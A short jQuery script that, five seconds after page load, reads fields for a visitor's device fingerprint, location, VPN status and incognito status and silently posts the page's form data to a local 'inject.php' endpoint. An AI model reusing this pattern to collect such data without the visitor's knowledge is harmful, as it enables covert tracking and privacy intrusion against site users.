var delayInMilliseconds = 5000;

setTimeout(function inject_data(){	 
	var Device_Fingerprint= $("#Device_Fingerprint").val();
	var current_location= $("#current_location").val();
	var vpn= $("#vpn").val();
	var incog= $("#incog").val();
	$.ajax({
		url:"inject.php",
		method: "POST",
		data: $('form').serialize(),
		dataType: "text",
	})	
}, delayInMilliseconds);